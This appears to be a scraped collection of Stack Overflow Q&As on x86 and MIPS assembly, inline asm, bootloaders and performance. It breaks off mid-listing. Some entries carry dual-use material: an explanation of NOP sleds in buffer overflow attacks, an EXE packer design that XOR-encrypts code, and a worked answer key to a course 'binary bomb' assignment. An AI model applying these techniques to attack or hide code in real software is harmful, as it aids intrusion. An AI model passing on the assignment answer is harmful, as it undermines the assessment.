<p>I know that I will want it to have kernel drivers that access peripheral hardware directly. Where should I look for advice and documentation for programming and understanding the interface to peripheral hardware the operating system will communicate with? I will need to understand how the operating system will receive input and interact with keyboards, mice, computer monitors, hard drives, USB, etc. etc. This is probably the area I know least about. </p>

<p>I have the Intel instruction set manuals and have been getting more familiar with assembly programming, so the CPU side of things is what I know the most about.</p>

<p>At this point I'm thinking that I'd like to implement the Linux system calls within my operating system so that programs that run on Linux can run on my operating system.  I want my operating system to use the ELF binary format. I wonder what obstacles I have to overcome to achieve this Linux compatibility. Are the main things implementing the system calls that Linux provides, and using the ELF format? What else?</p>

<p>I am also interested in people's thoughts about why it might not be a good idea to make your own operating system, and why it is a good idea to make your own operating system.</p>

<p>Thank you for any input.</p>
","<p>You'll probably just want to get it running inside of a virtual machine to begin with. It's a PITA trying to develop an OS on actual hardware (with the constant rebooting and debugging-over-serial-cable).</p>

<p>Inside a VM you've usually got a simplified (and relatively standardised) set of hardware to support which can ease initial development as well. In particular, if you want to show someone else your OS you just give them a .vhd file and be reasonably confident that if it works for you then it'll work for them as well.</p>

<p>You might also want to start with something that's already up &amp; running initially (for example, Microsoft's <a href=""http://singularity.codeplex.com/"" rel=""noreferrer"">Singularity</a> is pretty neat). That'll let you get all of the boring boot loader and basic device drivers out of the way and you can get onto the ""meaty"" stuff more quickly.</p>
","2800830"
"Linux assembler error ""impossible constraint in ‘asm’""","22796","","<p>I'm starting with assembler under Linux. I have saved the following code as testasm.c<br>
and compiled it with: gcc testasm.c -otestasm<br>
The compiler replies: ""impossible constraint in ‘asm’"".</p>

<pre><code>#include &lt;stdio.h&gt;
int main(void)
{
    int foo=10,bar=15;

    __asm__ __volatile__ (""addl %%ebx,%%eax""
        : ""=eax""(foo) 
        : ""eax""(foo), ""ebx""(bar) 
        : ""eax"" 
    );

    printf(""foo = %d"", foo);

    return 0;
}
</code></pre>

<p>How can I resolve this problem?
(I've copied the example from <a href=""http://asm.sourceforge.net/articles/linasm.html#InlineASM"" rel=""noreferrer"">here</a>.)</p>

<p>Debian Lenny, kernel 2.6.26-2-amd64<br>
gcc version 4.3.2 (Debian 4.3.2-1.1)</p>

<p><strong>Resolution</strong>:<br>
See the accepted answer - it seems the 'modified' clause is not supported any more.</p>
","<pre><code>__asm__ __volatile__ (""addl %%ebx,%%eax"" : ""=a""(foo) : ""a""(foo), ""b""(bar));
</code></pre>

<p>seems to work.  I believe that the syntax for register constraints changed at some point, but it's not terribly well documented.  I find it easier to write raw assembly and avoid the hassle.</p>
","1478600"
"How does a NOP sled work?","22726","","<p>I've been cracking my head open and can't find a good source that answers this question. I know that a nop sled is a technique used to circumvent stack randomization in a buffer overflow attack, but I can't get my head around how it works.</p>

<p>What's a simple example that illustrates this method?</p>

<p>What do terms like 128-byte nop sled mean?</p>
","<p>Some attacks consist of making the program jump to a specific address and continue running from there. The injected code has to be loaded previously somehow in that exact location.</p>

<p>Stack randomization and other runtime differences may make the address where the program will jump impossible to predict, so the attacker places a NOP sled in a big range of memory. If the program jumps to anywhere into the sled, it will run all the remaining NOPs, doing nothing, and then will run the payload code, just next to the sled.</p>

<p>The reason the attacker uses the NOP sled is to make the target address bigger: the code can jump anywhere in the sled, instead of exactly at the beginning of the injected code.</p>

<p>A 128-byte NOP sled is just a group of NOP intructions 128 bytes wide.</p>

<p>NOTE #1: NOP (No-OPeration) is an instruction available in most (all?) architectures that does nothing, other than occupying memory and some runtime.</p>

<p>NOTE #2: in architectures with variable length instructions, a NOP instruction is usually just one byte in length, so it can be used as a convenient instruction padding. Unfortunately, that also makes it easy to do a NOP sled.</p>
","14760699"
"Switch case assembly level code","22471","","<p>I am programming C on cygwin windows. After having done a bit of C programming and getting comfortable with the language, I wanted to look under the hood and see what the compiler is doing for the code that I write.  </p>

<p>So I wrote down a code block containing switch case statements and converted them into assembly using:  </p>

<pre><code>gcc -S foo.c  
</code></pre>

<p>Here is the C source:  </p>

<pre><code>switch(i)
{
    case 1:
    {
        printf(""Case 1\n"");
        break;
    }
    case 2:
    {           printf(""Case 2\n"");
        break;
    }
    case 3:
    {
        printf(""Case 3\n"");
        break;
    }
    case 4:
    {
        printf(""Case 4\n"");
        break;
    }
    case 5:
    {
        printf(""Case 5\n"");
        break;
    }
    case 6:
    {
        printf(""Case 6\n"");
        break;
    }
    case 7:
    {
        printf(""Case 7\n"");
        break;
    }
    case 8:
    {
        printf(""Case 8\n"");
        break;
    }
    case 9:
    {
        printf(""Case 9\n"");
        break;
    }
    case 10:
    {
        printf(""Case 10\n"");
        break;
    }
    default:
    {
        printf(""Nothing\n"");
        break;
    }
}  
</code></pre>

<p>Now the resultant assembly for the same is:  </p>

<pre><code>movl    $5, -4(%ebp)
cmpl    $10, -4(%ebp)
ja  L13
movl    -4(%ebp), %eax
sall    $2, %eax
movl    L14(%eax), %eax
jmp *%eax
.section .rdata,""dr""
.align 4
L14:
.long   L13
.long   L3
.long   L4
.long   L5
.long   L6
.long   L7
.long   L8
.long   L9
.long   L10
.long   L11
.long   L12
.text
L3:
movl    $LC0, (%esp)
call    _printf
jmp L2
L4:
movl    $LC1, (%esp)
call    _printf
jmp L2
L5:
movl    $LC2, (%esp)
call    _printf
jmp L2
L6:
movl    $LC3, (%esp)
call    _printf
jmp L2
L7:
movl    $LC4, (%esp)
call    _printf
jmp L2
L8:
movl    $LC5, (%esp)
call    _printf
jmp L2
L9:
movl    $LC6, (%esp)
call    _printf
jmp L2
L10:
movl    $LC7, (%esp)
call    _printf
jmp L2
L11:
movl    $LC8, (%esp)
call    _printf
jmp L2
L12:
movl    $LC9, (%esp)
call    _printf
jmp L2
L13:
movl    $LC10, (%esp)
call    _printf
L2:  
</code></pre>

<p>Now, in  the assembly, the code is first checking the last case (i.e. case 10) first. This is very strange. And then it is copying 'i' into 'eax' and doing things that are beyond me.  </p>

<p>I have heard that the compiler implements some jump table for switch..case. Is it what this code is doing? Or what is it doing and why? Because in case of less number of cases,
the code is pretty similar to that generated for if...else ladder, but when number of cases increases, this unusual-looking implementation is seen.</p>

<p>Thanks in advance.</p>
","<p>First the code is comparing the i to 10 and jumping to the default case when the value is greater then 10 (<code>cmpl    $10, -4(%ebp)</code> followed by <code>ja L13</code>).</p>

<p>The next bit of code is shifting the input to the left by two (<code>sall    $2, %eax</code>) which is the same as multiple by four which generates an offset into the jump table (because each entry in the table is 4 bytes long) </p>

<p>It then loads an address from the jump table (<code>movl    L14(%eax), %eax</code>) and jumps to it (<code>jmp *%eax</code>).</p>

<p>The jump table is simply a list of addresses (represented in assembly code by labels):</p>

<pre><code>L14:
.long   L13
.long   L3
.long   L4
...
</code></pre>

<p>One thing to notice is that <code>L13</code> represents the default case.  It is both the first entry in the jump table (for when i is 0) and is handled specially at the beginning (when i > 10).</p>
","3012085"
"Can I use Intel syntax of x86 assembly with GCC?","22457","","<p>I want to write a small low level program. For some parts of it I will need to use assembly language, but the rest of the code will be written on C/C++.</p>

<p>So, if I will use GCC to mix C/C++ with assembly code, do I need to use AT&amp;T syntax or can 
I use Intel syntax? Or how do you mix C/C++ and asm (intel syntax) in some other way?</p>

<p>I realize that maybe I don't have a choice and must use AT&amp;T syntax, but I want to be sure..</p>

<p>And if there turns out to be no choice, where I can find full/official documentation about the AT&amp;T syntax?</p>

<p>Thanks!</p>
","<p>If you are using separate assembly files, gas has a directive to support Intel syntax:</p>

<pre><code>.intel_syntax noprefix
</code></pre>

<p>which uses Intel syntax and doesn't need the % prefix before register names.</p>

<hr>

<p>If you are using inline assembly, you can compile with <code>-masm=intel</code></p>

<p>Using <code>.intel_syntax noprefix</code> at the start of inline asm, and switching back with <code>.att_syntax</code> can work, but <strong>will break</strong> if you use any <code>m</code> constraints.  The memory reference will still be generated in AT&amp;T syntax.</p>
","9347957"
"Binary Bomb - Phase 4","22409","","<p>I am having a very difficult time tracing the assembly code for the following binary bomb (An assignment from school where a bomb has to be defused, this bomb contains 6 phases which all have 1 correct input to proceed to the next phase). I am currently on phase_4 and it has a recursive function called func4. I have identified that the input is ""%d %d"" which is two integers. However, I cannot quite figure out what func4 is doing, even after getting the info on all registers throughout every step. </p>

<p>Phase_4:</p>

<pre><code>    (gdb) disas
Dump of assembler code for function phase_4:
=&gt; 0x08048e24 &lt;+0&gt;: sub    $0x2c,%esp
   0x08048e27 &lt;+3&gt;: lea    0x1c(%esp),%eax
   0x08048e2b &lt;+7&gt;: mov    %eax,0xc(%esp)
   0x08048e2f &lt;+11&gt;:    lea    0x18(%esp),%eax
   0x08048e33 &lt;+15&gt;:    mov    %eax,0x8(%esp)
   0x08048e37 &lt;+19&gt;:    movl   $0x804a7f1,0x4(%esp)
   0x08048e3f &lt;+27&gt;:    mov    0x30(%esp),%eax
   0x08048e43 &lt;+31&gt;:    mov    %eax,(%esp)
   0x08048e46 &lt;+34&gt;:    call   0x80488d0 &lt;__isoc99_sscanf@plt&gt;
   0x08048e4b &lt;+39&gt;:    cmp    $0x2,%eax
   0x08048e4e &lt;+42&gt;:    jne    0x8048e5d &lt;phase_4+57&gt;
   0x08048e50 &lt;+44&gt;:    mov    0x18(%esp),%eax
   0x08048e54 &lt;+48&gt;:    test   %eax,%eax
   0x08048e56 &lt;+50&gt;:    js     0x8048e5d &lt;phase_4+57&gt;
   0x08048e58 &lt;+52&gt;:    cmp    $0xe,%eax
   0x08048e5b &lt;+55&gt;:    jle    0x8048e62 &lt;phase_4+62&gt;
   0x08048e5d &lt;+57&gt;:    call   0x8049470 &lt;explode_bomb&gt;
   0x08048e62 &lt;+62&gt;:    movl   $0xe,0x8(%esp)
   0x08048e6a &lt;+70&gt;:    movl   $0x0,0x4(%esp)
   0x08048e72 &lt;+78&gt;:    mov    0x18(%esp),%eax
   0x08048e76 &lt;+82&gt;:    mov    %eax,(%esp)
   0x08048e79 &lt;+85&gt;:    call   0x8048dbb &lt;func4&gt;
   0x08048e7e &lt;+90&gt;:    cmp    $0x25,%eax
   0x08048e81 &lt;+93&gt;:    jne    0x8048e8a &lt;phase_4+102&gt;
   0x08048e83 &lt;+95&gt;:    cmpl   $0x25,0x1c(%esp)
   0x08048e88 &lt;+100&gt;:   je     0x8048e8f &lt;phase_4+107&gt;
   0x08048e8a &lt;+102&gt;:   call   0x8049470 &lt;explode_bomb&gt;
   0x08048e8f &lt;+107&gt;:   add    $0x2c,%esp
   0x08048e92 &lt;+110&gt;:   ret    
    End of assembler dump.
</code></pre>

<p>func4:</p>

<pre><code>Breakpoint 2, 0x08048dbb in func4 ()
(gdb) disas
Dump of assembler code for function func4:
=&gt; 0x08048dbb &lt;+0&gt;: sub    $0x1c,%esp
   0x08048dbe &lt;+3&gt;: mov    %ebx,0x14(%esp)
   0x08048dc2 &lt;+7&gt;: mov    %esi,0x18(%esp)
   0x08048dc6 &lt;+11&gt;:    mov    0x20(%esp),%eax
   0x08048dca &lt;+15&gt;:    mov    0x24(%esp),%edx
   0x08048dce &lt;+19&gt;:    mov    0x28(%esp),%esi
   0x08048dd2 &lt;+23&gt;:    mov    %esi,%ecx
   0x08048dd4 &lt;+25&gt;:    sub    %edx,%ecx
   0x08048dd6 &lt;+27&gt;:    mov    %ecx,%ebx
   0x08048dd8 &lt;+29&gt;:    shr    $0x1f,%ebx
   0x08048ddb &lt;+32&gt;:    add    %ebx,%ecx
   0x08048ddd &lt;+34&gt;:    sar    %ecx
   0x08048ddf &lt;+36&gt;:    lea    (%ecx,%edx,1),%ebx
   0x08048de2 &lt;+39&gt;:    cmp    %eax,%ebx
   0x08048de4 &lt;+41&gt;:    jle    0x8048dfd &lt;func4+66&gt;
   0x08048de6 &lt;+43&gt;:    lea    -0x1(%ebx),%ecx
   0x08048de9 &lt;+46&gt;:    mov    %ecx,0x8(%esp)
   0x08048ded &lt;+50&gt;:    mov    %edx,0x4(%esp)
   0x08048df1 &lt;+54&gt;:    mov    %eax,(%esp)
   0x08048df4 &lt;+57&gt;:    call   0x8048dbb &lt;func4&gt;
   0x08048df9 &lt;+62&gt;:    add    %eax,%ebx
   0x08048dfb &lt;+64&gt;:    jmp    0x8048e16 &lt;func4+91&gt;
   0x08048dfd &lt;+66&gt;:    cmp    %eax,%ebx
   0x08048dff &lt;+68&gt;:    jge    0x8048e16 &lt;func4+91&gt;
   0x08048e01 &lt;+70&gt;:    mov    %esi,0x8(%esp)
   0x08048e05 &lt;+74&gt;:    lea    0x1(%ebx),%edx
   0x08048e08 &lt;+77&gt;:    mov    %edx,0x4(%esp)
   0x08048e0c &lt;+81&gt;:    mov    %eax,(%esp)
   0x08048e0f &lt;+84&gt;:    call   0x8048dbb &lt;func4&gt;
   0x08048e14 &lt;+89&gt;:    add    %eax,%ebx
   0x08048e16 &lt;+91&gt;:    mov    %ebx,%eax
   0x08048e18 &lt;+93&gt;:    mov    0x14(%esp),%ebx
   0x08048e1c &lt;+97&gt;:    mov    0x18(%esp),%esi
   0x08048e20 &lt;+101&gt;:   add    $0x1c,%esp
   0x08048e23 &lt;+104&gt;:   ret    
End of assembler dump.
</code></pre>
","<p>I hope it's obvious that <code>phase4</code> is checking that the first number is in the range <code>0</code>..<code>14</code> inclusive (see lines <code>+44</code>..<code>+57</code>)
Then it invokes <code>func4</code> with three arguments: the first number entered, <code>0</code> and <code>14</code> (lines <code>+62</code>..<code>+85</code>). Next it checks that the return value is <code>0x25</code> (37 decimal) on line <code>+90</code> and that the second number entered is also <code>37</code> (line <code>+95</code>)</p>

<p>Let's move on to <code>func4</code>. I'll call the three arguments <code>x</code>, <code>low</code> and <code>high</code>. Initially you don't know what they are of course. Lines <code>+23</code>..<code>+34</code> calculate <code>(high - low) / 2</code>. The ugly mess is because the compiler generates code to handle negative numbers with truncation to zero. We won't see any negative numbers though. Line <code>+36</code> is just a fancy addition, so in <code>ebx</code> we now have <code>low + (high - low) / 2</code> which is also known as the average of the two numbers. The code then compares this average to the number <code>x</code> that has been provided as first argument. Lines <code>+43</code>..<code>+62</code> get executed if <code>x &lt; average</code> and they invoke <code>func4(x, low, average - 1)</code> and add the returned value to the average. Similarly, lines <code>+70</code>..<code>+89</code> get executed if <code>x &gt; average</code> and calculate <code>average + func4(x, average + 1, high)</code>. If <code>x == average</code> then just the average itself is returned.</p>

<p>It's basically doing a binary search and summing up the guesses as it goes. Given that the interval has 15 elements, it will need at most 4 guesses. The first guess is going to be <code>7</code>, so to get the required result of <code>37</code> we need <code>30</code> more. We have at most 3 more tries and all the guesses will be either less than 7 or more than 7. Since <code>7 * 3 = 21</code> and that can't give us <code>30</code> it means the number has to be greater than 7. Second guess is thus going to be <code>(8 + 14) / 2 = 11</code>, making our sum <code>18</code> with <code>19</code> more to go. If the number was above 11 that would mean we overshoot the target, so the number must be more than 7 and less than 11. Third guess is thus <code>(8 + 10) / 2 = 9</code> which brings the sum to <code>27</code> with <code>10</code> more to go and just a single guess, so that means the number is <code>10</code>.</p>

<p>TL;DR: the correct input should be <code>10</code> and <code>37</code></p>
","19646901"
"JMP to absolute address (op codes)","22374","","<p>I'm trying to code a exe packer/protector as a way of learning more about assembler, c++, and how PE files work. I've currently got it working so the section containing the EP is XORed with a key and a new section is created that contains my decryption code. Everything works out great except when I try and JMP to the original EP after decryption.</p>

<p>Basically I do this:</p>

<pre><code>DWORD originalEntryPoint = optionalHeader-&gt;AddressOfEntryPoint;
// -- snip -- //
    crypted.put(0xE9);
 crypted.write((char*)&amp;orginalEntryPoint, sizeof(DWORD)); 
</code></pre>

<p>But instead of it jumping to the entry point, ollydbg shows that this code disassembles to:</p>

<pre><code>00404030   .-E9 00100000    JMP 00405035 ; should be 00401000 =[
</code></pre>

<p>and when I try to change it manually in olly the new opcode shows up as</p>

<pre><code>00404030    -E9 CBCFFFFF    JMP crypted.00401000
</code></pre>

<p>Where did 0xCBCFFFFF come from? How would I generate that from the C++ side?</p>
","<p>I think that <code>E9</code> is an opcode for a relative jump: its operand specifies a relative distance to be jumped, plus or minus from the start of the next instruction.</p>

<p>If you want the operand to specify an absolute address, you would need a different opcode.</p>
","1546224"
"Prefetching Examples?","22338","","<p>Can anyone give an example or a link to an example which uses <code>__builtin_prefetch</code> in GCC (or just the asm instruction prefetcht0 in general) to gain a substantial performance advantage? In particular, I'd like the example to meet the following criteria:</p>

<ol>
<li>It is a simple, small, self-contained example.</li>
<li>Removing the <code>__builtin_prefetch</code> instruction results in performance degradation.</li>
<li>Replacing the <code>__builtin_prefetch</code> instruction with the corresponding memory access results in performance degradation.</li>
</ol>

<p>That is, I want the shortest example showing <code>__builtin_prefetch</code> performing an optimization that couldn't be managed without it.</p>
","<p>Here's an actual piece of code that I've pulled out of a larger project. (Sorry, it's the shortest one I can find that had a noticable speedup from prefetching.)
This code performs a very large data transpose.</p>

<p>This example uses the SSE prefetch instructions, which may be the same as the one that GCC emits.</p>

<p>To run this example, you will need to compile this for x64 and have more than 4GB of memory. You can run it with a smaller datasize, but it will be too fast to time.</p>

<pre><code>#include &lt;iostream&gt;
using std::cout;
using std::endl;

#include &lt;emmintrin.h&gt;
#include &lt;malloc.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;

#define ENABLE_PREFETCH


#define f_vector    __m128d
#define i_ptr       size_t
inline void swap_block(f_vector *A,f_vector *B,i_ptr L){
    //  To be super-optimized later.

    f_vector *stop = A + L;

    do{
        f_vector tmpA = *A;
        f_vector tmpB = *B;
        *A++ = tmpB;
        *B++ = tmpA;
    }while (A &lt; stop);
}
void transpose_even(f_vector *T,i_ptr block,i_ptr x){
    //  Transposes T.
    //  T contains x columns and x rows.
    //  Each unit is of size (block * sizeof(f_vector)) bytes.

    //Conditions:
    //  - 0 &lt; block
    //  - 1 &lt; x

    i_ptr row_size = block * x;
    i_ptr iter_size = row_size + block;

    //  End of entire matrix.
    f_vector *stop_T = T + row_size * x;
    f_vector *end = stop_T - row_size;

    //  Iterate each row.
    f_vector *y_iter = T;
    do{
        //  Iterate each column.
        f_vector *ptr_x = y_iter + block;
        f_vector *ptr_y = y_iter + row_size;

        do{

#ifdef ENABLE_PREFETCH
            _mm_prefetch((char*)(ptr_y + row_size),_MM_HINT_T0);
#endif

            swap_block(ptr_x,ptr_y,block);

            ptr_x += block;
            ptr_y += row_size;
        }while (ptr_y &lt; stop_T);

        y_iter += iter_size;
    }while (y_iter &lt; end);
}
int main(){

    i_ptr dimension = 4096;
    i_ptr block = 16;

    i_ptr words = block * dimension * dimension;
    i_ptr bytes = words * sizeof(f_vector);

    cout &lt;&lt; ""bytes = "" &lt;&lt; bytes &lt;&lt; endl;
//    system(""pause"");

    f_vector *T = (f_vector*)_mm_malloc(bytes,16);
    if (T == NULL){
        cout &lt;&lt; ""Memory Allocation Failure"" &lt;&lt; endl;
        system(""pause"");
        exit(1);
    }
    memset(T,0,bytes);

    //  Perform in-place data transpose
    cout &lt;&lt; ""Starting Data Transpose...   "";
    clock_t start = clock();
    transpose_even(T,block,dimension);
    clock_t end = clock();

    cout &lt;&lt; ""Done"" &lt;&lt; endl;
    cout &lt;&lt; ""Time: "" &lt;&lt; (double)(end - start) / CLOCKS_PER_SEC &lt;&lt; "" seconds"" &lt;&lt; endl;

    _mm_free(T);
    system(""pause"");
}
</code></pre>

<p>When I run it with ENABLE_PREFETCH enabled, this is the output:</p>

<pre><code>bytes = 4294967296
Starting Data Transpose...   Done
Time: 0.725 seconds
Press any key to continue . . .
</code></pre>

<p>When I run it with ENABLE_PREFETCH disabled, this is the output:</p>

<pre><code>bytes = 4294967296
Starting Data Transpose...   Done
Time: 0.822 seconds
Press any key to continue . . .
</code></pre>

<p>So there's a 13% speedup from prefetching.</p>

<p>EDIT:</p>

<p>Here's some more results:</p>

<pre><code>Operating System: Windows 7 Professional/Ultimate
Compiler: Visual Studio 2010 SP1
Compile Mode: x64 Release

Intel Core i7 860 @ 2.8 GHz, 8 GB DDR3 @ 1333 MHz
Prefetch   : 0.868
No Prefetch: 0.960

Intel Core i7 920 @ 3.5 GHz, 12 GB DDR3 @ 1333 MHz
Prefetch   : 0.725
No Prefetch: 0.822

Intel Core i7 2600K @ 4.6 GHz, 16 GB DDR3 @ 1333 MHz
Prefetch   : 0.718
No Prefetch: 0.796

2 x Intel Xeon X5482 @ 3.2 GHz, 64 GB DDR2 @ 800 MHz
Prefetch   : 2.273
No Prefetch: 2.666
</code></pre>
","7328195"
"Write Bootloader in C","22336","","<p>I am a newbie in writing bootloaders. I have written a helloworld bootloader in asm, and
I am now trying to write one in C. I have written a helloworld bootloader in C, but I cannot compile it.</p>

<p>This is my code. What am I doing wrong? Am I taking the wrong approach entirely?</p>

<pre><code>void print_char();
int main(void){
char *MSG = ""Hello World!"";
int i;

__asm__(
    ""mov %0, %%SI;""
    :
    :""g""(MSG)
);
for(i=0;i&lt;12;i++){
    __asm__(
        ""mov %0, %%AL;""
        :
        :""g""(MSG[i])
    );
    print_char();
}

return 0;
}

void print_char(){
__asm__(
    ""mov $0X0E, %AH;""
    ""mov $0x00, %BH;""
    ""mov $0x04, %BL;""
    ""int $0x10""
);
}
</code></pre>
","<p>I would suggest you to have a look at <a href=""http://wiki.osdev.org/Rolling_Your_Own_Bootloader"" rel=""noreferrer"">http://wiki.osdev.org/Rolling_Your_Own_Bootloader</a> and also the Bootloader section of : <a href=""http://www.brokenthorn.com/Resources/OSDevIndex.html"" rel=""noreferrer"">http://www.brokenthorn.com/Resources/OSDevIndex.html</a></p>

<p>There are excellent tutorials to get yourself started to make yourself your own bootloader. Also you can join the #osdev channel in freenode to join a discussion if you need more information.</p>
","7080355"
"What's the purpose of the rotate instructions (ROL, RCL on x86)?","22281","","<p>I always wondered what's the purpose of the rotate instructions some CPUs have (ROL, RCL on x86,  for example). What kind of software makes use of these instructions? I first thought they may be used for encryption/computing hash codes, but these libraries are written usually in C, which doesn't have operators that map to these instructions.<br>
Has anybody found an use for them? Why where they added to the instructions set?</p>
","<p>Rotates are required for bit shifts across multiple words. When you SHL the lower word, the high-order bit spills out into the carry. To complete the operation, you need to shift the higher word(s) while bringing in the carry to the low-order bit. RCL is the instruction that accomplishes this.</p>

<pre>
                      High word             Low word         CF
Initial          0110 1001 1011 1001   1100 0010 0000 1101    ?
SHL low word     0110 1001 1011 1001   1000 0100 0001 1010    1
RCL high word    1101 0011 0111 0011   1000 0100 0001 1010    1 
</pre>

<p>ROL and ROR are useful for examining a value bit-by-bit in a way that is (ultimately) non-destructive. They can also be used to shunt a bitmask around without bringing in garbage bits.</p>
","4976751"
"How to setup plugins for ollydbg 2.x.x?","22215","","<p>I downloaded the latest ollydbg 2.x version from its official site and some plugins from tuts4you. But how to enable/install the plugins?</p>
","<ul>
<li>either you put the plugin dll inside a dedicated directory (e.g. <code>Plugins</code>) or in the same directory than ollydbg.exe</li>
<li>in the <code>Options / Options... / Directories</code> panel, configure the <code>Plugin directory</code> setting accordingly to the place where you put the dll. If you put the dll in ollydbg.exe directory, you can set <code>.</code></li>
<li>restart OllyDbg</li>
<li>you should have a <code>plugins</code> menu where the plugins add their menus entry points</li>
</ul>

<p>This is a general procedure, you might need to adapt for specific plugins : e.g. some may need additional .txt or .ini files. This should be described inside the plugin package.</p>

<p>Also, if you have done this settings and still cannot see your plugin, beware that the plugin API had a recent major upgrade for version 2.01h. Some existing plugins may not be supported anymore.</p>

<p>If you don't have you plugin source code or cannot rebuild it yourself it is possible to try to patch the plugin dll to let it load in Olly. This is tricky because you need to patch the version number, and probably the callbacks in the dll concerned by the plugin api. The procedure is described <a href=""http://sluganalysislab.blogspot.com/2012/10/ollydbg-2xx-plugin-compatibility.html"" rel=""noreferrer"">in a screencast</a>.</p>
","14580133"
"x86 Assembly pushl/popl don't work with ""Error: suffix or operands invalid""","22153","","<p>I'm a newbie to assembly programming, working through <a href=""http://savannah.nongnu.org/projects/pgubook/"">Programming Ground Up</a> on an Ubuntu x86_64 desktop with GNU assembler v2.20.1.</p>

<p>I've been able to assemble/link execute my code, up until I get to using pushl/popl instructions for manipulating the stack. The following code fails to assemble:</p>

<pre><code> .section .data  # empty

 .section .text
.globl _start
_start:
 pushl $1       # push the value 1 onto the stack
 popl %eax      # pop 1 off the stack and into the %eax register
 int $0x80      # exit the program with exit code '1'
</code></pre>

<p>Using ""as test.s -o test.o"", these errors appear on the terminal and test.o is not created:</p>

<pre><code>test.s: Assembler messages: 
test.s:9: Error: suffix or operands invalid for 'push'
test.s:10:  Error: suffix or operands invalid for 'popl'
</code></pre>

<p>I've checked the documentation, and the operands I'm using for pushl and popl are valid. This isn't exactly a debugging question--so what's wrong with my code? Or is it my assembler?</p>
","<p>In 64-bit mode you cannot push and pop 32-bit values; you need <code>pushq</code> and <code>popq</code>.</p>

<p>Also, you will not get a proper exit this way. On 32-bit x86, you would need to set <code>%eax</code> to 1 to select the <code>exit()</code> system call, <em>and</em> set <code>%ebx</code> to the exit code you actually wish. On 64-bit x86 (that's what you are using), conventions are different: the system call number for <code>exit()</code> is 60, not 1; the first system call parameter goes in <code>%rdi</code>, not <code>%rbx</code>; the system-call invocation opcode is not <code>int $0x80</code> but the special, x86-64-only opcode <code>syscall</code>.</p>

<p>Which leads to:</p>

<pre><code>.section .data
.section .text
.globl _start
_start:
    pushq   $60
    popq    %rax
    pushq   $1
    popq    %rdi
    syscall
</code></pre>

<p>(each <code>push</code>/<code>pop</code> sequence can be replaced with a simple <code>mov</code> (like <code>mov $60, %eax</code>) of course; I suppose that you are trying to explicitly test <code>push</code> and <code>pop</code>, optimize for code-size, or avoid <code>0</code> bytes in the machine code (for an exploit payload))</p>

<hr>

<p>Related: </p>

<ul>
<li><a href=""https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64"">What are the calling conventions for UNIX &amp; Linux system calls on i386 and x86-64</a></li>
<li><a href=""https://stackoverflow.com/questions/46087730/what-happens-if-you-use-the-32-bit-int-0x80-linux-abi-in-64-bit-code"">What happens if you use the 32-bit int 0x80 Linux ABI in 64-bit code?</a></li>
</ul>
","5486040"
"Writing and learning assembly on a Mac","22036","","<p>I recently decided that I wanted to try learning how to program in assembly. Having a 2011 model MBP, I was not able to find much info on how to write and execute assembly code on my computer. If anyone could point me in the right direction on this (as well as provide any useful tutorials) it would be greatly appreciated. </p>
","<p>This should help you further: <a href=""http://zathras.de/angelweb/blog-learn-nasm-on-os-x.htm"">Learn NASM on OS X</a>.</p>
","7315681"
"Loop through an array MIPS Assembly","21821","","<p>I'm working on a program which loops through an array of 10 numbers. The first 9 elements have values higher than 0, the 10th has a value of 0. The loop should break when the 0 is encountered. </p>

<pre><code>i=0;
while(A[i]!=0)
{
    A[i]=A[i]+1;
    i++;
}
</code></pre>

<p>I know I can use 'beq' to break the loop if the value of the register is equal to 0. However I don't know enough about manipulating values in the memory. </p>

<p>It's my first time using MIPS and you'll see it's a mess. If you can't fix it for me, can you give me some pointers? </p>

<pre><code>.data  #by default, the ""data segment"" starts at address 0x10010000
.word 1
.word 2
.word 3
.word 4
.word 5
.word 6
.word 7
.word 8
.word 9
.word 0

.text #instructions start below

# MIPS assembly code

lui  $a0, 0x1001           # $a0 = 0x10010000
addi $a1, $zero, 0         # i = 0
jal increment              # call the procedure
</code></pre>

<p>Here's where I'm most lost:</p>

<pre><code>increment:
lui $a0, 0x1001           # $a0 = 0x10010000
beq $a0, $zero, else      # if $a0 holds 0 goto 'else'
addi $a0, $a0, 2          # +2
addi $a1, $zero, 1        # i = i + 1

jr $ra                   #jump to caller
</code></pre>

<p>$v0 should hold the sum of all the incremented values.</p>

<pre><code>else: 
add $a0, $v0, $zero #copy result as input to syscall
addi $v0,$zero,1 #service 1 for syscall is print integer
syscall
</code></pre>

<p>Finishes with an infinite loop.</p>

<pre><code>infinite: j infinite
</code></pre>
","<p>To load a value from a memory, you need to call one of the load instructions, (<code>lw</code>, <code>lh</code> or <code>lb</code> for word, half-word and byte). for example:</p>

<pre><code>lw $a1, 0($a2) # load a word from the address in $a2 + offset 0 to $a1
</code></pre>

<p>to write a value in memory, you use one of the store commands, for example:</p>

<pre><code>sw $a1, 0($a2) # store the word in $a1 into the address in $a2 + offset
</code></pre>

<p>loading an address into a register is done using la, for example</p>

<pre><code>la $a2, label_of_array # load the address of the label 'label_of_array' into $a2
</code></pre>

<p>Now, to manipulate the value in the array, you need to combine the three instructions from above:</p>

<pre><code>la $a1, label_of_array   # load the address of the array into $a1
lb $a2, 0($a1)           # load a byte from the array into $a2
addi $a2, $a2, 1         # increment $a2 by 1
sb $a2, 0($a1)           # store the new value into memory
addi $a1, $a1, 1         # increment $a1 by one, to point to the next element in the array
</code></pre>

<p>And another point:</p>

<p>You wrote <code>addi $a1, $zero, 1        # i = i + 1</code> but this is wrong. What you did is to store the result of <code>$zero + 1</code> which is <code>1</code> into <code>$a1</code>. In order to increment <code>$a1</code>, you need to write <code>addi $a1, $a1, 1</code> which is ""store the result of <code>$a1 + 1</code> into <code>$a1</code>.</p>
","14916933"
"Fastest way to find out minimum of 3 numbers?","21657","","<p>In a program I wrote, 20% of the time is being spent on finding out the minimum of 3 numbers in an inner loop, in this routine:</p>

<pre><code>static inline unsigned int
min(unsigned int a, unsigned int b, unsigned int c)
{
    unsigned int m = a;
    if (m &gt; b) m = b;
    if (m &gt; c) m = c;
    return m;
}
</code></pre>

<p>Is there any way to speed this up? I am ok with assembly code too for x86/x86_64.</p>

<p>Edit: In reply to some of the comments:<br>
* Compiler being used is gcc 4.3.3 <br/>
* As far as assembly is concerned, I am only a beginner there. I asked for assembly here, to learn how to do this. :) <br/>
* I have a quad-core Intel 64 running, so MMX/SSE etc. are supported. <br/>
* It's hard to post the loop here, but I can tell you it's a heavily optimized implementation of the levenshtein algorithm. <br/></p>

<p>This is what the compiler is giving me for the non-inlined version of min:</p>

<pre><code>.globl min
    .type   min, @function
min:
    pushl   %ebp
    movl    %esp, %ebp
